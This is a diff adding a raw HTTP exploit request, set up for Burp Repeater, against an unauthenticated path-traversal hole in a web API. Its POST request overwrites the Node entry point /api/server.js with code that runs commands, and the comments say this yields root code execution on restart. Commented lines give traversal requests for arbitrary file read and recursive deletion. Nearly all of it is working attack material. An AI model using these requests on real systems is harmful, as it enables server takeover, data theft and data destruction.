@@ -1,0 +1,13 @@
+# Raw request - unauthenticated arbitrary file write (traversal). Paste into Burp Repeater.
+# Overwriting /api/server.js (the Node entry point) yields RCE as root on next restart.
+POST /_api/resource/..%2f..%2fapi%2fserver.js HTTP/1.1
+Host: TARGET:8092
+Content-Type: application/json
+Connection: close
+
+{"isFile":true,"content":"const cp=require('child_process');const fs=require('fs');try{fs.writeFileSync('/RCE_PROOF.txt','RCE uid='+cp.execSync('id').toString());}catch(e){};require('http').createServer((q,s)=>s.end('pwned')).listen(8080);"}
+
+# --- arbitrary READ (leaks <path>/<lane>/*.md outside /tasks) ---
+# GET /_api/resource/..%2f..%2fopt HTTP/1.1
+# --- arbitrary recursive DELETE ---
+# DELETE /_api/resource/..%2f..%2ftmp%2fvictim HTTP/1.1
